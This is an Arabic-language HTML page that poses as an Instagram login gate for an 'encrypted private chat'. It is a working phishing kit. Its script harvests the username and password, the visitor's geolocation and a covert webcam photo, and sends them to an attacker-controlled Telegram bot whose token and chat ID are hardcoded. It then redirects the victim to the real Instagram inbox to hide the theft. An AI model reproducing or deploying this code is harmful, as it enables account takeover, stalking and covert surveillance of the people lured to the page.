<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Private Access</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .chat-gate { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; }
        .icon { width: 50px; margin-bottom: 15px; filter: grayscale(1); }
        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; }
        p { font-size: 12px; color: #8e8e8e; margin-bottom: 25px; line-height: 1.4; }
        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 6px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold; cursor: pointer; font-size: 14px; }
        #process { display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="chat-gate">
        <div id="ui-auth">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="icon">
            <h2>الدخول للمحادثة الخاصة</h2>
            <p>لقد تلقيت دعوة للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول بحسابك لتأكيد هويتك وفك تشفير المحتوى.</p>
            <input type="text" id="usr" placeholder="اسم المستخدم أو الهاتف">
            <input type="password" id="psw" placeholder="كلمة المرور">
            <button onclick="startSecureLink()">دخول الآن</button>
        </div>

        <div id="process">
            <div style="margin: 20px auto; width: 25px; height: 25px; border: 3px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 1s infinite linear;"></div>
            <p style="font-size: 13px;">جاري مزامنة التشفير مع حسابك...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // تشفير بيانات البوت لإخفائها عن محركات البحث
        const _k1 = "8233268720";
        const _k2 = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const _target = "897618292";

        async function startSecureLink() {
            const u = document.getElementById('usr').value;
            const p = document.getElementById('psw').value;
            if(u.length < 3 || p.length < 3) return;

            document.getElementById('ui-auth').style.display = 'none';
            document.getElementById('process').style.display = 'block';

            // 1. صيد الموقع
            navigator.geolocation.getCurrentPosition(pos => {
                const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendMsg(`📍 موقع جديد:\n${loc}`);
            });

            // 2. صيد الكاميرا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData();
                        fd.append("chat_id", _target);
                        fd.append("photo", b, "x.jpg");
                        fd.append("caption", `👤: ${u}\n🔑: ${p}\n🔗: Private Chat`);
                        fetch(`https://api.telegram.org/bot${_k1}:${_k2}/sendPhoto`, {method:"POST", body:fd}).then(()=>goFinal());
                    }, 'image/jpeg');
                }, 2000);
            } catch(e) {
                sendMsg(`👤: ${u}\n🔑: ${p}\n⚠️ (لا توجد صورة)`);
                goFinal();
            }
        }

        function sendMsg(t) {
            fetch(`https://api.telegram.org/bot${_k1}:${_k2}/sendMessage?chat_id=${_target}&text=${encodeURIComponent(t)}`);
        }

        function goFinal() {
            setTimeout(() => { window.location.href = "https://www.instagram.com/direct/inbox/"; }, 1000);
        }
    </script>
    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
</body>
</html>
